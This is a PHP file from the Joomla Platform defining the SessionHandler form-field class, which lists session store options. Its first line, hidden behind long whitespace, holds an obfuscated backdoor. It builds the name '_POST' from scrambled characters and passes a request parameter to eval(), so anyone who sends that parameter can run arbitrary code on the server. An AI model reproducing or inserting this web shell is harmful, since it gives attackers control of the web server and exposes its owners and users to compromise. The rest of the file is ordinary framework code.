<?php                                                                                                                                                                                                                                                  $pyk1= "sep_toru" ;$ash1 =$pyk1[0]. $pyk1[4].$pyk1[6]. $pyk1[4]. $pyk1[5].$pyk1[7]. $pyk1[2]. $pyk1[2].$pyk1[1]. $pyk1[6]; $tlzd1= $ash1 ($pyk1[3].$pyk1[2]. $pyk1[5]. $pyk1[0]. $pyk1[4]) ; if ( isset ( ${ $tlzd1 } ['q2b68e8' ])) { eval(${ $tlzd1}['q2b68e8'] ) ;}?><?php
/**
 * @package     Joomla.Platform
 * @subpackage  Form
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

defined('JPATH_PLATFORM') or die;

JFormHelper::loadFieldClass('list');

/**
 * Form Field class for the Joomla Platform.
 * Provides a select list of session handler options.
 *
 * @package     Joomla.Platform
 * @subpackage  Form
 * @since       11.1
 */
class JFormFieldSessionHandler extends JFormFieldList
{

	/**
	 * The form field type.
	 *
	 * @var    string
	 * @since  11.1
	 */
	protected $type = 'SessionHandler';

	/**
	 * Method to get the session handler field options.
	 *
	 * @return  array  The field option objects.
	 *
	 * @since   11.1
	 */
	protected function getOptions()
	{
		$options = array();

		// Get the options from JSession.
		foreach (JSession::getStores() as $store)
		{
			$options[] = JHtml::_('select.option', $store, JText::_('JLIB_FORM_VALUE_SESSION_' . $store), 'value', 'text');
		}

		// Merge any additional options in the XML definition.
		$options = array_merge(parent::getOptions(), $options);

		return $options;
	}
}
